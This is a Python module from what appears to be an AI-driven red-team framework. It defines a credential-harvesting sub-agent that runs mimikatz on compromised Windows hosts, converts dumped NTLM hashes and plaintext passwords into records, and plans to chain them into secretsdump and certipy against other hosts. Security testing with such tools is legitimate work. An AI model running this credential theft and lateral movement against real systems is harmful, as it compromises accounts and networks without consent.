"""CredHarvester sub-agent.

Wraps the three cred-harvest tools added in Phase 4 Task 5:

* :func:`mimikatz_wrapper` — runs on a Windows foothold (the foothold
  shell session manager in Phase 6 executes the saved command and
  captures ``sekurlsa::logonpasswords`` output).
* :func:`secretsdump` — runs on the AutoRed host (impacket) against a
  remote target, requires credentials.
* :func:`certipy` — runs on the AutoRed host against an AD CS,
  requires credentials + DC coordinates.

The sub-agent dispatches based on ``os_type``:

* ``"windows"`` — runs mimikatz on the foothold and converts the
  parsed credentials into :class:`Secret` records (one per NTLM hash
  and one per plaintext password).
* ``"linux"`` — defers secretsdump / SSH-key extraction to Phase 5
  (the Phase 4 stub doesn't have harvested plaintext creds to feed
  secretsdump).
* ``"ad"`` — defers certipy to Phase 5 (needs AD user credentials,
  which the cred-harvesting pipeline hasn't chained in yet).

Phase 5 will extend the dispatch with credential-chaining: once
mimikatz yields a domain user's plaintext, that credential feeds
certipy and secretsdump against other hosts.
"""
from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.postex import Secret
from autored.tools.certipy import CertipyResult, certipy  # noqa: F401  (re-exported for test patching + Phase 5 dispatch)
from autored.tools.mimikatz import MimikatzResult, mimikatz_wrapper
from autored.tools.secretsdump import SecretsdumpResult, secretsdump  # noqa: F401  (re-exported for test patching + Phase 5 dispatch)

log = get_logger("subagents.credharvester")


class CredHarvesterOutput(BaseModel):
    host_ip: str
    secrets: list[Secret] = Field(default_factory=list)
    mimikatz_result: MimikatzResult | None = None
    secretsdump_result: SecretsdumpResult | None = None
    certipy_result: CertipyResult | None = None


def _secrets_from_mimikatz(
    mimikatz: MimikatzResult, host_ip: str,
) -> list[Secret]:
    """Convert mimikatz credentials into Secret records.

    Each credential dict may carry an NTLM hash and / or a plaintext
    password; each piece of secret material becomes its own Secret
    record. The ``source`` field is ``mimikatz:<provider>/<username>``
    so the Phase 5 report can trace the secret back to its origin.
    """
    secrets: list[Secret] = []
    for cred in mimikatz.credentials:
        username = cred.get("username", "") or ""
        provider = cred.get("provider", "") or ""
        source = f"mimikatz:{provider}/{username}" if username else f"mimikatz:{provider}"
        ntlm = cred.get("ntlm", "")
        if ntlm:
            secrets.append(Secret(
                host_ip=host_ip,
                secret_type="hash",
                secret_value=ntlm,
                source=source,
            ))
        password = cred.get("password", "")
        if password:
            secrets.append(Secret(
                host_ip=host_ip,
                secret_type="password",
                secret_value=password,
                source=source,
            ))
    return secrets


@tool
async def credharvester_subagent(
    foothold_id: str,
    host_ip: str,
    os_type: str,
    engagement_id: str = "",
) -> CredHarvesterOutput:
    """Harvest credentials from a foothold based on its OS type.

    Args:
        foothold_id: ID of the foothold to harvest from.
        host_ip: IP of the foothold host.
        os_type: ``"windows"``, ``"linux"``, or ``"ad"``.
        engagement_id: Current engagement ID.

    Returns:
        CredHarvesterOutput with harvested Secret records. On Windows
        footholds the mimikatz result is also surfaced verbatim.
    """
    log.info(
        "credharvester_start",
        host_ip=host_ip, foothold_id=foothold_id, os_type=os_type,
    )

    secrets: list[Secret] = []
    mimikatz_result: MimikatzResult | None = None
    secretsdump_result: SecretsdumpResult | None = None
    certipy_result: CertipyResult | None = None

    if os_type == "windows":
        mimikatz_result = await mimikatz_wrapper.ainvoke({
            "foothold_id": foothold_id,
            "host_ip": host_ip,
            "engagement_id": engagement_id,
        })
        secrets.extend(_secrets_from_mimikatz(mimikatz_result, host_ip))
    elif os_type == "linux":
        # Phase 5 will chain harvested plaintext credentials into a
        # secretsdump call against the Linux host's SAM-equivalent
        # (e.g., /etc/shadow via wmiexec). For Phase 4 we leave the
        # secrets list empty.
        log.info("credharvester_linux_deferred", host_ip=host_ip)
    elif os_type == "ad":
        # Phase 5 will chain harvested domain credentials into a
        # certipy find call against the domain controller.
        log.info("credharvester_ad_deferred", host_ip=host_ip)
    else:
        log.warning("credharvester_unknown_os", os_type=os_type, host_ip=host_ip)

    log.info(
        "credharvester_done",
        host_ip=host_ip, os_type=os_type, secrets=len(secrets),
    )
    return CredHarvesterOutput(
        host_ip=host_ip,
        secrets=secrets,
        mimikatz_result=mimikatz_result,
        secretsdump_result=secretsdump_result,
        certipy_result=certipy_result,
    )
